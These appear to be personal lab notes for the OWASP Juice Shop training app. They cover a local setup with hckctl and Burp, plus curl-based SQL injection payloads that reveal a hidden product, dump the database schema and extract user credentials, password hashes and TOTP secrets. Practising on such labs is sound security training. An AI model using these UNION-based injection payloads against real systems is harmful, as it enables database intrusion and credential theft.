# Juice Shop

Resources

* [Official documentation](https://owasp.org/www-project-juice-shop)
* [Pwning OWASP Juice Shop](https://help.owasp-juice.shop)

Local setup

```bash
# starts vulnerable box
hckctl box start vulnerable/owasp-juice-shop

# starts attack box
hckctl box start parrot-sec

# default password: parrot
# vnc/noVNC copy&paste clipboard: CTRL+SHIFT+C/V
vncviewer localhost:5900

# install burp
burpsuite

# install add-on
# name: burpsuite
# address: localhost
# port: 8080
install_firefox_foxy_proxy
```

## Challenges

* [Challenge hunting](https://help.owasp-juice.shop/part2/)

### Finding the Score Board

Guess link `http://box-owasp-juice-shop-<RANDOM>:3000/#/score-board`

### Injection

Resources

* [SQL injection](https://portswigger.net/web-security/sql-injection)

Intercept request with burp and look for a request with parameters

```bash
# send to intruder
#GET /rest/products/search?q=';

# show SQLi vulnerability
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo';" | jq
# output
{
  "error": {
    "message": "SQLITE_ERROR: near \";\": syntax error",
    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%foo';%' OR description LIKE '%foo';%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```

Order the Christmas special offer of 2014

```bash
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq

# with firefox or burp edit and send a POST request with ProductId=10
#http://box-owasp-juice-shop-0eruj:3000/api/BasketItems
#{"ProductId":10,"BasketId":"6","quantity":1}
```

Exfiltrate the entire DB schema definition via SQL Injection

```bash
# Products table has 9 columns (see json above)
# to fix "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
# add N static columns in order to match them
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo%'))+UNION+SELECT+name,sql,'a','b','c','d','e','f','g'+FROM+sqlite_master+WHERE+type='table';--" | jq '.data | map({"id":.id,"name":.name})'
```

Log in with the (non-existing) accountant without ever registering that user

```bash
TODO
```

Retrieve a list of all user credentials via SQL Injection

```bash
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | jq '.data'
```
